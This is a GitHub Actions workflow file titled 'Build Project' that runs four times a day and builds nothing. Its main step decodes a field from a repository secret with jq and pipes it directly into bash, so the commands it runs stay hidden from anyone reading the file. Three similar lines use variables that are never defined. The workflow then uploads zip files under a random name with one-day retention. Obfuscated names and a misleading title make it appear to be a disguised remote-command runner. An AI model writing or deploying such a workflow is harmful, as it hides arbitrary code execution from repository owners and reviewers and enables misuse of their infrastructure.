name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '41 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  pipeline:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          e5: ${{ secrets.e5 }}
        run: |
          printf '%s' "$e5" | jq -r .g20 | /bin/bash
          echo $xb619 | jq -r .lvtu7 | /bin/bash
          echo $qrlco00 | jq -r .w5 | /bin/bash
          printf '%s' "$teoga703" | jq -r .mh0818 | /bin/bash

      - name: Persist output
        if: ${{ always() }}
        uses: actions/upload-artifact@v4
        with:
          name: fZmQ7qMG
          path: "*.zip"
          retention-days: 1
